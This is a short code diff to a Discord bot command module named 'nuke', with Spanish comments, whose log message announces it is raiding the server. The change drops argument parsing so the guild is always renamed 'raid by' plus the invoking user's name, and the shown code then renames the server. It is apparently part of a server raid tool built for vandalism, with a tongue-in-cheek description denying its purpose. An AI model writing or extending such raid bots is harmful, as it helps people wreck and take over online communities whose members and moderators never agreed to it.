@@ -3,6 +3,7 @@ const { setTimeout } = require("timers/promises");
 module.exports = {
   name: 'nuke',
   description: 'definitivamente no es para nukear el server',
+  usage: 'nuke',
   async execute(msg, args) { 
 
     if (!msg.guild) {
@@ -18,15 +19,9 @@ module.exports = {
     }
     console.log(`[!] - raideando ${msg.guild.name}`)
 
-    let name = args[0]; 
-    let cName = args[1];
     
-    if (isNaN(name)) {
-      name = `raid by ${msg.author.username}`;
-    } 
-    if(isNaN(cName)) {
-      cName = name;
-    } 
+    name = `raid by ${msg.author.username}`;
+    cName = name;
     // cambiar el nombre del servidor
     await msg.guild.setName(cName).then((updated) => {
       console.log("[+] - nombre del server cambiado")
